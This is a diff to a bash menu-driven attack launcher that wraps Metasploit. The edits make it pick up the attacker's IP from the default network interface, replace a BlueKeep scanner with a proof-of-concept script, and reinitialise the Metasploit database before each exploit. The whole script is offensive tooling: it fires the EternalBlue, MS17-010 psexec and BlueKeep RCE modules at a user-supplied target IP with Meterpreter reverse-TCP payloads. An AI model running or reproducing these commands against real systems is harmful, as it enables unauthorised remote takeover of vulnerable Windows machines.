@@ -30,7 +30,8 @@ pack2="winVista/winXP/win2000/winserver2003"
 pack3="win8/win8.1/win10/winserver2012 x64"
 shell="$:"
 en="Enter"
-loc_ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
+iface=$(ip -o -4 route show to default | awk '{print $5}')
+loc_ip=$(ip addr show $iface | awk '/inet / {print $2}' | cut -d/ -f 1)
 #STARTUP
 function banner(){
 
@@ -40,7 +41,7 @@ function banner(){
 	echo "		|   |  /        \ |    |    \____   |"
 	echo "		|___| /_______  / |____|    / ______|"
 	echo "		              \/            \/"
-	echo -e "$green			Programmed By$red Cyborg$nc\n"
+	echo -e "$green			Programmed By$red Cyborg$nc, edited By$red Getdrive$nc\n"
 }
 
 function exp(){
@@ -139,6 +140,7 @@ function back(){
 	}
 
 function main(){
+
 echo -e "$white[$green$n1$white] Scan IP $yellow($red$e$yellow/$blue$b$yellow)$nc"
 echo -e "$white[$green$n2$white] exploit"
 echo -e "$white[$green$n3$white] info"
@@ -163,7 +165,7 @@ back
 elif [[ $ch1 == "2" ]]; then
 echo ""
 read -p "$(echo -e $white$en$green ip$white addr$green : $nc)" ipv4
-python scanners/bluekeep_scanner.py --host $ipv4
+python scanners/bluekeep_poc.py -i $ipv4
 back
 elif [[ $ch1 == "3" ]]; then
 clear
@@ -180,7 +182,7 @@ read -p "$(echo -e $red$shell $nc)" ch2
 if [[ $ch2 == "1" ]]; then
 echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t1
-msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue;
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue;
 set payload windows/x64/meterpreter/reverse_tcp;
 set lhost $loc_ip;
 set rhost $t1;
@@ -188,7 +190,7 @@ exploit; "
 elif [[ $ch2 == "2" ]]; then
 echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t2
-msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec;
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec;
 set payload windows/x64/meterpreter/reverse_tcp;
 set lhost $loc_ip;
 set rhost $t2;
@@ -196,7 +198,7 @@ exploit ;"
 elif [[ $ch2 == "3" ]]; then
 echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t3
-msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue_win8;
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue_win8;
 set payload windows/x64/meterpreter/reverse_tcp;
 set lhost $loc_ip;
 set rhost $t3;
@@ -204,7 +206,7 @@ exploit ;"
 elif [[ $ch2 == "4" ]]; then
 echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t4
-msfconsole -q -x " use windows/rdp/cve_2019_0708_bluekeep_rce;
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use windows/rdp/cve_2019_0708_bluekeep_rce;
 set payload windows/x64/meterpreter/reverse_tcp;
 set lhost $loc_ip;
 set rhost $t4;
